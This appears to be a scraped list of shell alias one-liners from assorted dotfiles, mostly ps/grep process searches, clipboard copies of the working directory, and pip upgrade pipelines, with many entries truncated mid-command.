python -m pip install -U pip && pip list --outdated --format=legacy | cut -d' ' -f1 | grep -ivF \
python -m pip freeze | perl -pe 's/==.+//g' | xargs -n1 sudo -H python -m pip uninstall -y
python -m json.tool|pygmentize -l javascript|less
python -m json.tool | pygmentize -l json | less
python -m SimpleHTTPServer || python3 -m http.server
python -m SimpleHTTPServer || python -m http.server
python -m SimpleHTTPServer 8080 || python -m http.server 8080
python -m SimpleHTTPServer 8000 --silent || python -m http.server 8000
python -m IPython || python
python $([ -e manage.py ] && echo manage.py || echo */manage.py)
pyenv virtualenvs | cut -d ' ' -f3 | grep -v '^[0-9]'
pyenv versions --bare --skip-aliases | cut -d'/' -f1 | uniq
pydf||df -h
pydf | head -n 1; pydf | grep --colour=never /dev/sd
pydf | grep -vP afs\|snap
pwgen 20 1 | pbcopy | pbpaste; echo 'has been copied to your clipboard'
pwgen -s 20 1 | tr -d '\n' | pbcopy
pwgen -nB1 | tr '[a-z]' '[A-Z]' | pbcopy && pbpaste
pwgen -n 32 1 | tr -d '\n' | pbcopy
pwgen -1 -sy 20 | tr -d '\n' | pbcopy
pwd|xargs echo -n|pbcopy
pwd|tr -d '\n'|pbcopy
pwd|tr -d '\n' | pbcopy
pwdhash google.com | sed -n 2p | xargs -0 -I XXX gcalcli --user miles.sandlar@gmail.com --pw XXX
pwd;pwd | tr -d '\n' | pbcopy
pwd;ls -al | grep -v ^d | awk {
pwd;find . | sort | sed
pwd;du -ck | sort -nr | head
pwd; echo '..'; ls -F | sort | cat
pwd |tr -d '\n' |pbcopy
pwd | xclip -i -sel p -f | xclip -i -sel c
pwd | xargs echo-n | pbcopy
pwd | xargs echo -n | xclip
pwd | xargs echo -n | setclip
pwd | xargs echo -n | pbcopy
pwd | tr \\\n \\\000 | xargs --null ${l} --directory
pwd | tr \'/\' \'\\\\\\\\\' | sed \
pwd | tr -d '\n' | xsel -ib; pwd
pwd | tr -d '\n' | xsel -ib
pwd | tr -d '\n' | xsel -i -b
pwd | tr -d '\n' | xsel -b
pwd | tr -d '\n' | xcopy
pwd | tr -d '\n' | xclip -selection clipboard 1> /dev/null
pwd | tr -d '\n' | xclip -selection clipboard
pwd | tr -d '\n' | tcopy
pwd | tr -d '\n' | pbcopy; echo copied working dir to clipboard
pwd | tr -d '\n' | pbcopy && echo 'pwd copied to clipboard'
pwd | tr -d '\n' | pbcopy
pwd | tr -d '\n' | clip && echo 'pwd copied to clipboard'
pwd | tr -d '\\n' | pbcopy
pwd | tr -d '[:space:]' | xclip -selection clipboard && echo pwd copied to clipboard
pwd | tr --delete '\n' | pbcopy
pwd | tr '\n' ' '| pbcopy
pwd | tee | xclip -i; xclip -o
pwd | tee /dev/stderr | xsel --clipboard --input
pwd | ruby -pe'\$_.chomp!' | pbcopy
pwd | perl -pe 's/\n//' | pbcopy
pwd | pbcopy | xargs
pwd | pbcopy | pwd
pwd | head -c -1 | xsel -i -b
pwd | head -c -1 | xsel -i
pwd | head -c -1 | xclip -selection clipboard
pwd | head -c -1 | setclip
pwd | chomp | pbcopy
pwd -P | tr -d '\n' | pbcopy
pwd && du -h . 2>/dev/null | tail -1 | awk '{print $1}'
pushd ~/repos/treehouse && ./gradlew :projects:rolodex-data-pipeline:omnes-offset-job:clean && ./gradlew :projects:rolodex-data-pipeline:omnes-offset-job:shadowjar || popd
pushd ~/code/love-texts && serve || popd
pushd ~/checkouts/puppet/dev/ && rm -r ./doc || true && puppet doc --mode rdoc --manifestdir ~/checkouts/puppet/dev/manifests --modulepath ~/checkouts/puppet/dev/modules:~/checkouts/puppet/dev/services && sudo rsync -avz --delete ./doc/ /usr/local/www/doc/ && popd
pushd `pwd`; cd /vagrant; git diff refs/remotes/origin/master --name-only | grep .py$ | xargs pep8; popd
pushd $hmh_dir/misc/ > /dev/null && (./build.sh || true) && popd > /dev/null
purge = branch --merged master | grep -v master | xargs git branch -d
publican build --langs=en-US --formats=test || notify-send 'PUBLICAN ERROR -- YOU SUCK'
psu|sort -nrk+4|head
psu|sort -nrk+3|head
pstree | grep -E 'java|python'
pstree -w | grep alles | grep -v grep
pstree -s $$ | grep sh- -o | wc -l
pss | grep -v grep |grep
psql $( [ -d /d/Job/chapow/back ] && echo -v home=/d/Job/chapow/back || echo -v home=/tmp)
psm | grep vlc | getandkill
psm | grep ssh | getandkill
psm | grep python | getandkill
psm | grep mintty | getandkill
psm | grep bash | getandkill
psgrep-silent hipchat | awk '{print $2}' | xargs kill && start-hipchat4
psc | grep -v grep | grep $@
psc -ef | grep java | ~/dev/scripts/colour.sh
psall | sort -rnk 7 | less
psa | grep -v grep | grep -i -e VSZ -e
psa | grep -v grep | grep
ps | head -n 1; ps | grep \!*
ps | head -n 1; ps | grep $USER
ps | head -n 1; ps | grep $UID
ps | head -n 1 && ps | grep -i
ps | grep java | grep jdk
ps | grep -v iTerm | grep -v bash
ps | grep -v grep | grep dnsmasq > /dev/null
ps | grep -v grep | grep -i -e VSZ -e
ps | grep -v grep | grep -i
ps | grep -v grep | grep $@
ps | grep -v grep | grep
ps | grep 'em ' | grep -v grep
ps x | grep ceqlotron | grep -v grep
ps wwaux|grep -v grep|grep
ps wwaux | head -n 1 && ps wwaux | egrep
ps wwaux | grep -v grep | grep -i --color
ps waux | grep -v grep | grep
ps ux | grep davilin | awk '{count ++} END {print count}'
ps ux | grep -v grep | grep -i
ps uax | grep -v grep | grep
ps u | grep [U]SER; ps aux | grep -i
ps j | grep -v grep | grep
ps hax -o user | sort | uniq -c' #processes per use
ps hax -o user | sort | uniq -c
ps faxu | grep -v grep | grep
ps fax | grep tomcat | grep java
ps fax | grep tomcat | grep apache
ps faux|grep -v grep|grep -i
ps faux|grep -v grep|grep
ps fauxwww | grep -v grep | grep
ps fauxww | head -1 && ps fauxww | grep --color -iE
ps ax|grep -v grep|grep -iE
ps ax|grep -v grep|grep
ps axww | grep http | grep s\
ps axw | grep weblogic | grep -v
ps axu|grep [a]fplay|awk '{print $12}'
ps axu|egrep 'jack|pulse'
ps axu | grep httpd | wc -l
ps axu | grep -v grep | grep -i
ps ax |grep ./redis-server | while read PID rest; do kill \${PID}; done
ps ax | sort | more
ps ax | pgrep -f 'ssh -fNC condor' | while read i; do kill -15 $i; done
ps ax | grep ssh | grep -v grep
ps ax | grep memcached | grep -v grep
ps ax | grep java | grep -v grep
ps ax | grep [s]yncd | wc -l
ps ax | grep [g]psi | wc -l
ps ax | grep /castis | grep -v grep
ps ax | grep -v grep | grep -i -e VSZ -e
ps ax | grep -v grep | grep -i
ps ax | grep -v grep | grep --color
ps ax | grep -v grep | grep $1
ps ax | grep -v grep | grep
ps ax | grep -v grep | egrep
ps ax | grep -v 'grep --color' | grep
ps ax | grep -i [g]radledaemon | awk '{print $1;}'
ps ax | grep --invert-match grep | grep
ps ax | fzf -e +s | awk '{print \$1}'
ps auzf | sort -nr -k 3 | head -10
ps aux|head -n 1 && ps aux|ag
ps aux|grep wine|awk
ps aux|grep ssh | awk
ps aux|grep celery|wc -l
ps aux|grep [f]irefox|awk
ps aux|grep -v grep|grep -i
ps aux|grep -v grep|grep
ps aux|grep -v grep | grep -i
ps aux| grep -v grep| grep -i
ps aux| grep -v grep| grep
ps aux| grep -v grep |g
ps aux| grep -v grep | grep -i
ps auxx|egrep -v '[g]rep'|grep -i
ps auxw|sort -k 2|grep $USER
ps auxw|grep -v grep|grep
ps auxww|sort +1 -n|more
ps auxww|head -1; ps auxww|grep
ps auxww|grep -v grep|grep
ps auxwwww | grep -v grep | grep
ps auxwww | head -n 1; ps auxwww | grep -Ei
ps auxwww | head -n 1 ; ps auxwww | grep -Ei
ps auxwww | grep -v grep | grep -i
ps auxwww | grep -v grep | grep
ps auxww | sort | more
ps auxww | sort -n +1 | less -SF
ps auxww | grep monty | more
ps auxww | grep -v grep | grep -i --color
ps auxww | grep -v grep | grep -i
ps auxww | grep -v grep | grep --color=never
ps auxww | grep -v grep | grep
ps auxww | grep --invert-match grep | grep
ps auxww | command grep -e '^USER\\|^${USER}'
ps auxww | /bin/grep -v grep | /bin/grep --color=never
ps auxww | /bin/grep -v grep | /bin/grep --color=auto
ps auxw | grep -v grep | sort -n -k3
ps auxw | grep -v grep | grep -i
ps auxw | grep -v grep | grep
ps auxw | grep -i screen | grep -v grep
ps auxw | grep $USER | wc -l
ps auxmww|grep -v grep|grep
ps auxh | grep -v grep | grep -i -e VSZ -e
ps auxgww | sort -nk +4 | tail
ps auxf|head -1;ps auxf|egrep --color=always -B4 -i
ps auxf|grep -v grep|grep
ps auxf | sort -r -k 4 | head -10
ps auxf | sort -r -k 3 | head -10
ps auxf | sort -nrk 4 | head -10
ps auxf | sort -nrk 4 | bat -l sh --theme=1337
ps auxf | sort -nrk 3 | head -10
ps auxf | sort -nrk 3 | bat -l sh --theme=1337
ps auxf | sort -nr -k3 | head -10
ps auxf | sort -nr -k 5 | head -n 5
ps auxf | sort -nr -k 5 | head -10
ps auxf | sort -nr -k 4 | head 10
ps auxf | sort -nr -k 4 | head -n 25
ps auxf | sort -nr -k 4 | head -n 10
ps auxf | sort -nr -k 4 | head -5
ps auxf | sort -nr -k 4 | head -20
ps auxf | sort -nr -k 4 | head -2
ps auxf | sort -nr -k 4 | head -10'
ps auxf | sort -nr -k 4 | head -10
ps auxf | sort -nr -k 4 | head
ps auxf | sort -nr -k 3 | head -n 25
ps auxf | sort -nr -k 3 | head -n 10
ps auxf | sort -nr -k 3 | head -5
ps auxf | sort -nr -k 3 | head -20
ps auxf | sort -nr -k 3 | head -2
ps auxf | sort -nr -k 3 | head -10'
ps auxf | sort -nr -k 3 | head -10
ps auxf | sort -nr -k -4 | head -10
ps auxf | head -n 1 && ps auxf | sort -nr -k 4
ps auxf | head -n 1 && ps auxf | sort -nr -k 3
ps auxf | grep traffic | grep -v grep
ps auxf | grep -v grep | grep -i -e VSZ -e
ps auxf | grep -v grep | egrep
ps auxf | fgrep -v grep | fgrep -ie VSZ -e
ps auxf --sort=start_time | grep -E 'blind|^USER'
ps aux |peco | awk
ps aux |head -n 1 && ps aux |grep -i $1
ps aux |head -1; ps aux |grep $1
ps aux |grep robot_type|grep -v grep
ps aux |grep -v grep |grep -i
ps aux |grep -v grep |grep $1
ps aux |grep -v grep | grep
ps aux | wc | awk '{print $1}'
ps aux | tail -n +2| fzf
ps aux | sort -rnk 4 | head
ps aux | sort -r -nk 4 | head -n 10
ps aux | sort -nrk 4 | head
ps aux | sort -nrk 3 | head
ps aux | sort -nr -k 4 | head -10
ps aux | sort -nr -k 3 | head -10
ps aux | sort -nk +6 | tail -n 15
ps aux | sort -nk +5 | tail
ps aux | sort -nk +4 | tail -n 20
ps aux | sort -nk +4 | tail -4
ps aux | sort -nk +4 | tail
ps aux | sort -nk +3 | tail -4
ps aux | sort -n -r -k 3 | cut -c -$(tput cols)
ps aux | sort -n -k 2 | tail -10
ps aux | sort -n +3 | tail -10
ps aux | sort -n +2 | tail -10
ps aux | sort -n &3 | tail -10
ps aux | sort -n &2 | tail -10
ps aux | sort -b -k 4 | tail
ps aux | sort --stable --parallel=2 -k4rh | head -n 5
ps aux | sort --stable --parallel=2 -k3rh | head -n 5
ps aux | sort --key 3 | awk \
ps aux | selecta | awk '{print \$2}'
ps aux | sed -e '1d' | awk '{ print $3 \
ps aux | sed -e '/notes/!d' -e 's/[a-zA-Z]\+\s\+\([0-9]\+\).*/\1/' | while read pid; do kill -9 \$pid; done
ps aux | rg -v rg | rg -i -e VSZ -e
ps aux | pgrep RzUpdater | xargs kill
ps aux | percol | awk '{ print \$2 }'
ps aux | percol | awk '{ print $2 }'
ps aux | less | grep
ps aux | head -n1; ps aux | grep -i
ps aux | head -n1 && ps aux | grep
ps aux | head -n 1; ps aux | rg
ps aux | head -n 1 && ps aux | grep
ps aux | head -1; ps aux | grep [p]ython
ps aux | head -1; ps aux | grep -i
ps aux | head -1; ps aux | grep $1
ps aux | head -1; ps aux | grep
ps aux | head -1; ps aux | ag
ps aux | head -1 && ps aux | sort
ps aux | head -1 && ps aux | grep \
ps aux | head -1 && ps aux | grep -i
ps aux | head -1 && ps aux | grep
ps aux | grep wine | awk
ps aux | grep unicorn | awk
ps aux | grep tmux | grep -v grep
ps aux | grep ssserver | grep -v grep
ps aux | grep ruby | grep -v grep
ps aux | grep ros | awk '{print $2}'
ps aux | grep puppet | grep -v grep
ps aux | grep php-fpm | wc -l ; ps --no-headers -o \
ps aux | grep mysql | grep -v grep
ps aux | grep java | grep cc_process
ps aux | grep grep -v | grep -i
ps aux | grep dmulling | grep tmux
ps aux | grep dd | grep 'if='
ps aux | grep coreaudiod | awk
ps aux | grep celery | grep -v grep
ps aux | grep 62102 | grep tair
ps aux | grep 2222 | grep -v grep
ps aux | grep -vw grep | grep
ps aux | grep -v grep |grep -i -e VSZ -e
ps aux | grep -v grep | grep vim
ps aux | grep -v grep | grep python
ps aux | grep -v grep | grep node
ps aux | grep -v grep | grep defunct
ps aux | grep -v grep | grep Z
ps aux | grep -v grep | grep -i -e VSZ -e
ps aux | grep -v grep | grep -i -e USER -e
ps aux | grep -v grep | grep -i -e
ps aux | grep -v grep | grep -i --color=auto $1
ps aux | grep -v grep | grep -i --color=auto
ps aux | grep -v grep | grep -i --color
ps aux | grep -v grep | grep -i $1
ps aux | grep -v grep | grep -i
ps aux | grep -v grep | grep -e VSZ -i -e
ps aux | grep -v grep | grep -ai
ps aux | grep -v grep | grep -Ev
ps aux | grep -v grep | grep -E
ps aux | grep -v grep | grep --ignore-case -e VSZ -e
ps aux | grep -v grep | grep --color=never -i -e VSZ -e
ps aux | grep -v grep | grep --color=auto
ps aux | grep -v grep | grep --color=always
ps aux | grep -v grep | grep --color -i
ps aux | grep -v grep | grep --color
ps aux | grep -v grep | grep ${USER}
ps aux | grep -v grep | grep $@ -i --color=auto
ps aux | grep -v grep | grep $@
ps aux | grep -v grep | grep $1
ps aux | grep -v grep | grep
ps aux | grep -v grep - | grep
ps aux | grep -v condor_shadow | grep awoodard
ps aux | grep -v 'grep' | grep
ps aux | grep -v 'grep --color' | grep
ps aux | grep -i sftp | grep -v grep
ps aux | grep -i elasticsearch | awk {
ps aux | grep -i cassandra | awk {
ps aux | grep --invert-match grep | grep
ps aux | grep --color=always -v grep | grep --color=always -i
ps aux | grep 'python' | grep $USER
ps aux | grep '\-bash' | wc -l
ps aux | grep 'Chrome' | awk '{vsz += $5; rss += $6} END { print \
ps aux | grep $USER | grep -v grep
ps aux | grep $USER | grep
ps aux | grep $* | grep -v grep
ps aux | egrep -v egrep | egrep -i
ps aux | egrep -v egrep | egrep
ps aux | egrep -v '(^_|^root)'
ps aux | egrep 'sql|neo4j' --color
ps aux | awk {'print $8'} | grep -c Z
ps aux | awk '{print \$8}' | grep -c Z
ps aux | awk '/spring/ {print $1}' | xargs kill
ps aux | ag rails | awk
ps aux | ag emacs-snapshot | awk
ps aux | ag -v ag | ag
ps aux | /bin/grep -v egrep | /bin/egrep --color=auto
ps aux --sort=-%cpu | grep -m 11 -v `whoami` | ccze -A
ps auwwx| grep -v grep | grep
ps aucx | fgrep -v fgrep | fgrep
ps ahuwx | sort -nr -k 4 | head -n10
ps ahuwx | sort -nr -k 3 | head -n10
ps afx | sort -nr -k 4 | head -n 25
ps afx | sort -nr -k 4 | head -n 10
ps afx | sort -nr -k 3 | head -n 25
ps afx | sort -nr -k 3 | head -n 10
ps af | /bin/grep -v egrep | /bin/egrep --color=auto
ps a | grep -v grep | grep -i -e VSZ -e
ps Aww | grep nmmain.py | grep -v grep
ps A | grep -v grep | grep -i
ps -x|grep -v grep|grep -v ps
ps -u daq | grep daqdpga | awk '{print \
ps -p $$ | tail -1 | awk '{print $NF}'
ps -o nlwp -auxww | head -1; ps -o nlwp -auxww | grep
ps -o comm $PID | grep zsh | wc -l
ps -lA | head -n 1; ps -lA | grep -i
ps -fu $USER | grep java | grep -v grep
ps -fA | egrep telepathy\\\\/ > >(cat) > >(awk '{ print \$2 }' | xargs -L1 kill)
ps -f | head -n 1 && ps -ef | grep
ps -f | grep mehtavia | grep java
ps -f | grep ^rom | grep -A12 dev\.
ps -e|egrep tripoli|wc -l
ps -e|egrep menhir|wc -l
ps -ev | grep -i chrome | awk
ps -eo pcpu -o pid -o command -o user|sort -nr|head
ps -elf | head -1; ps -elf | awk '{if (\$5 == 1 && \$3 != \
ps -elf | head -1; ps -elf | awk '{if ($5 == 1) {print $0}}'
ps -elf | grep java | grep jboss
ps -elf | grep controlmaster | grep -v grep
ps -elf | grep -v grep | grep -i
ps -elf | grep -v $$ | grep -i -e WCHAN -e
ps -ef|grep |wc -l
ps -ef|grep python|grep -v ' grep '
ps -ef|grep nginx|grep -v grep
ps -ef|grep -v grep|grep ords.war
ps -ef|grep -v grep|grep -i $1
ps -ef|grep -v grep|grep -i
ps -ef|grep -v grep|grep $1
ps -ef|grep -v grep|grep
ps -ef|grep -v grep| grep -w
ps -ef|grep -v grep |grep
ps -ef|grep -v 'grep --color=auto'|grep
ps -ef|grep $USER|grep
ps -ef| grep -v grep | grep tnslsnr
ps -ef| grep -v grep | grep ora_
ps -efwww | awk '/[eE]macs/ { print \$2 }' | xargs kill -9
ps -efww | grep -v grep | grep java
ps -efww | grep -v grep | grep -i
ps -efw | grep -v grep | grep
ps -efa | grep $USER | grep
ps -ef |grep dave |grep
ps -ef |grep aria2c |awk
ps -ef | sed 1d | eval
ps -ef | sed -e 's#java -Xmx.*m -Xss2048k -Djffi.boot.library.path=/opt/jruby/lib/native/i386-Linux:/opt/jruby/lib/native/ppc-Linux:/opt/jruby/lib/native/x86_64-Linux -Xbootclasspath/a:/opt/jruby/lib/jruby.jar -classpath :/opt/jruby/lib -Djruby.home=/opt/jruby -Djruby.lib=/opt/jruby/lib -Djruby.script=jruby -Djruby.shell=/bin/sh org.jruby.Main #jruby #' -e 's#/opt/depot/ruby-1.8.7-p248/lib/ruby/gems/1.8/gems/passenger-2.2.8/ext/apache2/ApplicationPoolServerExecutable 0 /opt/depot/ruby-1.8.7-p248/lib/ruby/gems/1.8/gems/passenger-2.2.8/bin/passenger-spawn-server#passenger-spawn-server #' | grep ruby
ps -ef | rg $USER | rg \
ps -ef | pgrep kav | sudo xargs kill -9
ps -ef | peco | awk
ps -ef | grep zabbix | grep -v grep
ps -ef | grep ssh | grep -v grep
ps -ef | grep spotify-client-firsttry | grep -v grep
ps -ef | grep simv | grep `whoami`
ps -ef | grep rdagent; ps -ef |grep nginx
ps -ef | grep python | grep -v grep
ps -ef | grep postgres | grep -v grep
ps -ef | grep polipo | grep -v grep; [ $? -ne 0 ] && polipo socksParentProxy=192.168.31.1:1082 &
ps -ef | grep openvpn | grep -v grep
ps -ef | grep michalm | grep
ps -ef | grep java | grep org.apache.oodt
ps -ef | grep java | grep -v grep
ps -ef | grep httpd | wc -l
ps -ef | grep http | grep -v grep
ps -ef | grep hn | grep -v grep
ps -ef | grep eighteen | grep -v grep
ps -ef | grep apache | grep -v grep
ps -ef | grep `whoami` | grep X11
ps -ef | grep [t]nslsnr | sort -k8
ps -ef | grep [p]mon_ | sort -k8
ps -ef | grep [g]unicorn | wc -l
ps -ef | grep Xvnc | grep -v root
ps -ef | grep -v grep | igrep
ps -ef | grep -v grep | grep python
ps -ef | grep -v grep | grep ovs
ps -ef | grep -v grep | grep nova
ps -ef | grep -v grep | grep neutron
ps -ef | grep -v grep | grep meta
ps -ef | grep -v grep | grep glance
ps -ef | grep -v grep | grep cinder
ps -ef | grep -v grep | grep api
ps -ef | grep -v grep | grep agent
ps -ef | grep -v grep | grep \$1
ps -ef | grep -v grep | grep -i --color=auto
ps -ef | grep -v grep | grep -i
ps -ef | grep -v grep | grep -e PPID -e
ps -ef | grep -v grep | grep -e
ps -ef | grep -v grep | grep --color=always
ps -ef | grep -v grep | grep --color
ps -ef | grep -v grep | grep $1
ps -ef | grep -v grep | grep
ps -ef | grep -v grep | egrep -i
ps -ef | grep -v 'grep' | grep
ps -ef | grep -v $$ | grep -i -e WCHAN -e
ps -ef | grep -v $$ | grep -i
ps -ef | grep -v $$ | grep
ps -ef | grep -V grep | grep -i vboxheadless
ps -ef | grep -E [j]ava | sed -e 's/ -cp [^ ]*//' -e 's/ -[^ ]*//g'
ps -ef | grep --color -v grep | sed
ps -ef | grep 'ssh -f' | grep -v grep
ps -ef | grep $processFilter | grep -v grep
ps -ef | grep $USER | sort
ps -ef | grep $USER | grep
ps -ef | fzf -m | awk '
ps -ef | fgrep -v grep | grep
ps -ef | awk '{print $2}' | xargs pargs
ps -ef f | grep -vw grep | grep -i
ps -ef --sort=start_time | grep -v grep | grep \
ps -ef --sort=start_time | grep -v grep | grep ${current_user}
ps -eaf|grep -v grep|grep -i
ps -eaf|grep -v grep|grep
ps -eaf | grep \!* | grep -v grep
ps -eaf | grep 'manage.py runserver' | grep
ps -eF | grep 'mongo\|PID'
ps -e | sort -b -k1 | head -10
ps -e | ack --output='\$1' '^\s*(\d+)\s[\d\w\?]+\s+[\d:.]+\spython\s-m' | xargs kill
ps -e u | sort -g -k 4 | tail
ps -e u | sort -g -k 3 | tail
ps -axww | grep http | grep s\
ps -axf | sort -nr -k 4 | head -10
ps -axf | sort -nr -k 3 | head -10
ps -axf | grep -v grep | grep -i
ps -axc -o pid -o comm|sort -k 2|gack $1
ps -ax | grep \!* | grep -v grep
ps -ax | grep -v grep | grep -i -e VSZ -e
ps -ax | grep -v grep | grep
ps -ax | grep $1 | grep -v grep
ps -ax -o %p%u%c%t | grep -v grep | grep $1
ps -auxwww | grep -v grep | grep -i
ps -auxw | sort -r +3 | more
ps -auxw | sort -r +2 | more
ps -auxf | sort -nr -k 4 | head -10
ps -auxf | sort -nr -k 3 | head -3
ps -auxf | sort -nr -k 3 | head -10
ps -aux | head -n -3 | grep
ps -aux | head -1 ; ps auxf | sort -nr -k 5
ps -aux | head -1 ; ps auxf | sort -nr -k 3
ps -aux | grep node | grep -v grep
ps -aux | grep -v grep | grep -i -e VSZ -e
ps -aux | grep -v grep | grep -i
ps -aux | grep -v grep | grep $1
ps -aux | grep -v grep | grep
ps -aux | grep --color=auto firefox | awk '{print $2}'
ps -aux | awk '{print$11}' | grep
ps -aux | ag -v 'ag ' | ag
ps -auwx | grep \!* | grep -v grep
ps -augxww | grep -v grep | grep -i
ps -auf | grep -vw grep | grep -i
ps -amcwwwxo 'command %mem %cpu' | grep -v grep | head -13
ps -afe|grep -v grep|grep
ps -af | grep -v grep | grep -i -e VSZ -e
ps -af | grep -v grep | grep $1
ps -aef|grep java|grep ${CATALINA_BASE}
ps -aef |grep -v grep | grep -i
ps -aef | grep tomcat | grep -v grep
ps -aef | grep tns | grep -v grep
ps -aef | grep mrp | grep -v grep
ps -aef | grep dbw | grep -v grep
ps -aef | grep -v grep | grep $1
ps -aef | grep -v grep | grep
ps -aef | grep -v $$ | grep
ps -aef | grep -i mongo | grep -v grep
ps -aef | grep -i gres | grep -v grep
ps -aef | grep -i activemq | grep -v grep
ps -aWl | grep -v grep | grep -i
ps -W | grep java | awk '{ print \$1 }'
ps -W | grep Inspect | xargs kill -f
ps -U zach | grep plug | grep -oP '(?<= )\d+ '
ps -Helf | grep -v $$ | grep -i -e WCHAN -e
ps -Helf | greo -v $$ | grep -i -e WCHAN -e
ps -F | head -n1 ; ps -eF | grep
ps -Alf|head -n 1 && ps -Alf|grep
ps -Ajww | grep -v grep | egrep -i
ps -Af | head -1 && ps -Af | grep
ps -Af | grep -v grep | grep -i $1
ps -Af | grep -v grep | grep $1
ps -Af | \grep -v grep | \grep
ps -Aef | head -1 && ps -Aef | grep
ps -A | grep -v grep | grep
ps -A u | sort -k 4 -r | head
ps --no-header -e aux | sort -r -k 4 | head -n 20
ps --no-header -e aux | sort -r -k 3 | head -n 20
ps -${Pseo} | grep -v -- grep | egrepi -E
ps -${PsWw}ef | grep -v grep | egrepi -E
ps $PSARGS | grep -v grep | grep
pry || irb
pry 2> /dev/null && return 0 || irb
pruned | awk '{print \$1}' | xargs git branch -D
prjquota majorana | grep majorana | awk '{print \
prjquota majorana | grep majorana | awk
pritunl-client list | awk 'FNR==2 {print $1}' | xargs pritunl-client stop
pritunl-client list | awk 'FNR==2 {print $1}' | xargs pritunl-client start
printf 'GET /kdist/finger_banner HTTP1.0\n\n' | nc www.kernel.org 80 | grep latest
printf '%s %s\n' ${(kv)modules} | column -t | sort
printf '$bldcyn' && git log --pretty=format:'%D' -1 && git log --format=format:'%Creset%Cgreen%h%Creset | %C(white)%an | %C(yellow)%cr%n%Creset%s%n%n%b%n'
printenv | sort |grep -i --color=always
printenv | sort | subl
printenv | sort | less
printenv | sort | grep .*_MYPATH
printenv | sort | grep -Pe '^[A-Z][A-Z0-9_]*(?==)'
printenv | grep XDG | sort
printenv | grep -e LS_COLORS -v | sort
print) 2> /dev/null || log_error 'alias with : in name fails'
print) 2> /dev/null || log_error 'alias beginning with : fails'
print) 2> /dev/null || err_exit 'alias with : in name fails'
print) 2> /dev/null || err_exit 'alias beginning with : fails'
print -rl -- ${(k)aliases} | sort | column
print -l ${(o)history%% *} | uniq -c | sort -nr
prev=$(fc -ln | tail -2 | head -1);gdb --args $prev
pr_warning && git push origin HEAD:$(git branch | grep \* | cut -c3-) && gpr
pr_warning && git push origin HEAD:$(git branch | grep \* | cut -c3-)
pr_warning && git push -f origin HEAD:$(git branch | grep \* | cut -c3-) && gpr
pr_warning && git push -f origin HEAD:$(git branch | grep \* | cut -c3-)
pp | grep -v supervisord | awk 'BEGIN{p=\
pp | egrep -i \!* |& grep -v 'egrep -i \!*'
powershell kill $(ps aux | grep java | awk '{print $4}')
poweroff || sudo poweroff > /dev/null 2>&1
ports | egrep 'Proto|LISTEN'
popd 2>/dev/null || cd -
popd 2>/dev/null 1>/dev/null || dmover directory stack is empty.
pod repo-art list | grep ^[a-zA-Z] | while read repo; do pod repo-art update \$repo; done
pod install || pod install --repo-update
pngpaste | convert -resize 400% /dev/stdin /dev/stdout | tesseract stdin stdout
pngpaste /tmp/pngpaste.png; curl -s -F sunset=86400 -F c=@- -F p=1 https://ptpb.pw/ < /tmp/pngpaste.png | egrep -o 'https:\/\/ptpb.pw\/.*' | pbcopy; rm /tmp/pngpaste.png
pngpaste - | tesseract stdin stdout | pbcopy; pbpaste
pngpaste - | convert - -resize 400% - | tesseract stdin stdout
pngpaste - | convert - -resize 200% - | tesseract stdin stdout
pmset -g batt | rg -o --pcre2 '([0-9]+\%).*' | cut -f3 -d' '
pmset -g batt | grep InternalBattery | sed -E s/.*\([[:digit:]]+:[[:digit:]]+\).*/\\\1/
pmset -g batt | grep InternalBattery | column -t
pmset -g batt | egrep '([0-9]+\%).*' -o --colour=auto | cut -f3 -d';'
pmset -g batt | egrep '([0-9]+\%).*' -o --colour=auto | cut -f1 -d';'
pmset -g batt | egrep '([0-9]+%).*' -o --colour=auto | cut -f3 -d';'
pmset -g batt | egrep '([0-9]+%).*' -o --colour=auto | cut -f1 -d';'
pmset -g assertions | egrep '(PreventUserIdleSystemSleep|PreventUserIdleDisplaySleep)'
pmd -dir src/main/java -R ~/conf/public/pmd/pmdx.xml | cut -d/ -f13- | sort -u
pmd -dir src/main/java -R ~/conf/public/pmd/pmd.xml | cut -d/ -f13- | sort -u
pls_ec2 | grep codename-webserver\\s\*prod | grep prod-\\d
plenv install --list | grep -v Available | peco
play -q -n synth 0.1 sin 680 || echo -e '\a'
pkill -SIGTERM chromium; sleep 1; { [ ! $(command -v shutdown_win7) ] || shutdown_win7 } && systemctl reboot
pkill -SIGTERM chromium; sleep 1; { [ ! $(command -v shutdown_win7) ] || shutdown_win7 } && systemctl poweroff
pkill -0 mpd || mpd && ncmpcpp
pipenv --venv && pipenv shell || ss_venv
pip3 list | awk '{print \$1}' | xargs pip3 install -U
pip3 list -o --format freeze | cut -d= -f1 | xargs pip3 install -U --user
pip3 list --outdated | cut -f1 -d\ | xargs -n1 -I% pip3 install --upgrade %
pip3 list --outdated | cut -d' ' -f1 | xargs pip3 install --upgrade
pip3 list --outdated | cut -d ' ' -f1 | xargs -n1 pip3 install -U
pip3 list --outdated | cut -d ' ' -f1 | xargs -n1 pip install -U
pip3 list --outdated --format=json | jq '.[].name' | xargs pip3 install -U
pip3 list --outdated --format=freeze | cut -d = -f 1 | xargs -n1 pip3 install --upgrade
pip3 list --outdated --format=columns | awk 'FNR > 3 {print $1}' | xargs pip3 install --upgrade
pip3 list --outdated --format freeze | awk -F = '{print $1}' | xargs pip3 install -U pip
pip3 list --format=legacy -o | awk '{ print $1 }' | xargs pip3 install -U
pip3 list --format=freeze --outdated | cut -d'=' -f1 | xargs pip3 install --user --upgrade
pip3 list --format=freeze --outdated | cut -d '=' -f1 | xargs -n1 sudo -H pip3 install -U
pip3 list --format legacy --outdated | sed 's/(.*//g' | xargs -n1 sudo -H pip3 install -U
pip3 install youtube-dl || pip install youtube-dl
pip3 freeze | cut -d= -f1 | parallel sudo pip3 install --upgrade
pip3 freeze --local |sed -rn 's/^([^=# \t\\][^ \t=]*)=.*/echo; echo Processing \1 ...; pip3 install -U \1/p' |sh
pip3 freeze --local | cut -d = -f 1 | xargs pip3 install --user -U
pip3 freeze --local | cut -d = -f 1 | xargs -n1 sudo -H pip3 install -U
pip2 list --outdated | cut -d ' ' -f1 | xargs -n1 pip2 install -U
pip2 list --outdated --format=columns | awk 'FNR > 2 {print $1}' | xargs pip2 install --upgrade
pip2 list --outdated --format freeze | awk -F = '{print $1}' | xargs pip2 install -U pip
pip2 list --format=freeze --outdated | cut -d'=' -f1 | xargs pip2 install --user --upgrade
pip2 freeze | cut -d= -f1 | parallel sudo pip2 install --upgrade
pip2 freeze --local |sed -rn 's/^([^=# \t\\][^ \t=]*)=.*/echo; echo Processing \1 ...; pip2 install -U \1/p' |sh
